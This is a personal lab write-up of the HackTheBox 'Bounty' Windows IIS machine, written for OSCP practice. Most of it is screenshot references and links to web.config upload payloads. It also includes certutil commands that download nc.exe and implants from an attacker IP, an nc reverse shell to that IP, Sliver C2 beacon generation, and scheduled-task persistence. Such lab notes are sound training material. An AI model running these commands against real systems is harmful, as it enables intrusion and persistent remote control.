# Bounty

Name: Bounty
Date:  16/5/2023
Difficulty:  Easy
Goals:  
- OSCP Prep & finish with speed as I have already reconed 
- Try Sherlock.ps1 
Learnt:
Beyond Root:
- Write my C Reverse Shell.

![](merlin.jpg)

## Future 

Having looked at the end and the being of the [[Bounty-Old-Attempt]], I do not want this to be a Helped-Through
and as of 16/5/2023 I want to finish of this easy box that should probably not take too long.
![](agood4months.png)

Obviously I understand I have reconed and there is a way to have a web shell on the box, but I have not read the web.config just incase there is a password in it. I wont look at the original directory either and be starting from a fresh VM.

naabunaabu.png

curlforoptions.png

exiftoolmerlin.png

uploadedfiles.png

IIS research 
[HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services) 

*"As any .Net application, MVC applications have a **web.config** file, where "**assemblyIdentity**" XML tags identifies every binary file the application uses... In addition, .Net MVC applications are structured to define **other web.config files**, having the aim to include any declaration for specific namespaces for each set of viewpages, relieving developers to declare “@using” namespaces in every file.*"

https://github.com/irsdl/IIS-ShortName-Scanner 

The SSL certifiactes are not valid for cloud flare on the links to some HackTricks Article
sploiterbutnotbreaking.png
[ivoidwarranties](https://www.ivoidwarranties.tech/posts/pentesting-tuts/iis/web-config/), which led to https://github.com/wireghoul/htshells - but for php


https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config

iisfinaltry.png

transferwoot.png


securefiletransfer.png

merlino.png

The weird one useness of this technique:
itseemitgetoneuse.png


```powershell
certutil -urlcache -split -f http://10.10.14.8/nc.exe c:\programdata\nc.exe
c:\programdata\nc.exe 10.10.14.8 8443 -e cmd
```

footholdintomerlin.png

```powershell
systeminfo
```

Sliver
```go
generate beacon --mtls 10.10.14.8:9001 --arch amd64 --os windows --save /home/kali/Bounty-Data
generate --mtls 10.10.14.8:9002 --arch amd64 --os windows --save /home/kali/Bounty-Data
mtls -L 10.10.14.8 -l 9001 
mtls -L 10.10.14.8 -l 9002
// Check jobs
jobs 
use sessionID
// upx the binaries
```
https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create
https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-delete
```powershell
curl -L https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1 -o Sherlock.ps1
certutil -urlcache -split -f http://10.10.14.8/Sherlock.ps1 c:\programdata\Sherlock.ps1
certutil -urlcache -split -f http://10.10.14.8/ACTUAL_JUMPSUIT.exe c:\programdata\ACTUAL_JUMPSUIT.exe
certutil -urlcache -split -f http://10.10.14.8/SUFFICIENT_LIFT.exe c:\programdata\SUFFICIENT_LIFT.exe

# I tried and failed - discovered /z

# Schedule tasks
schtasks /create /sc minute /mo 1 /tn ACTUAL_JUMPSUIT /tr c:\programdata\ACTUAL_JUMPSUIT.exe
schtasks /create /sc minute /mo 1 /tn SUFFICIENT_LIFT /tr c:\programdata\SUFFICIENT_LIFT.exe
# Deletes the task upon completion!
/z

schtasks /delete /tn ACTUAL_JUMPSUIT /f 
schtasks /delete /tn SUFFICIENT_LIFT /f 
```



## Notes 

IP: 10.10.10.93
OS: Windows
Hostname: Bounty
Machine Purpose: Webserver
Services: IIS 80
Service Languages: aspx
Users: merlin
Credentials:
